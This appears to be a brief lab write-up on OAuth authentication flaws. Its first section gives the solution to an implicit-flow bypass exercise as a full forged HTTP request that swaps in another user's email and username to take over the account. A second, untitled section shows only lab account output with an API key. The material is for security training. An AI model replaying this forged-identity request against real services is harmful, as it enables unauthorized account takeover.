# OAuth 2.0 authentication vulnerabilities

### >> 1. Authentication bypass via OAuth implicit flow
> This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password. To solve the lab, log in to Carlos's account. His email address is carlos@carlos-montoya.net. You can log in with your own social media account using the following credentials: wiener:peter.`

Solution: 
- Change the payload to reflect the email address and username of Carlos
````http
POST /authenticate HTTP/1.1
Host: ac2e1fea1e94ca5bc1979089008c00ce.web-security-academy.net
Cookie: session=AYlXg9S3SS3Yb7OjYfXNTGl8gFqgRvdt
Content-Length: 111
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="101"
Accept: application/json
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Origin: https://ac2e1fea1e94ca5bc1979089008c00ce.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://ac2e1fea1e94ca5bc1979089008c00ce.web-security-academy.net/oauth-callback
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"email":"carlos@carlos-montoya.net","username":"carlos","token":"tY2Y8c57C6kHCy8X3BxnE4Hm3YoJyeOfMuhjlkFSQeb"}
````

### >> 2. 

````
Your username is: wiener
Your email is: wiener@hotdog.com
Your API Key is: ux9JvKvqHiuWs4byoGWJ8Bp4AtRij6Ce

````
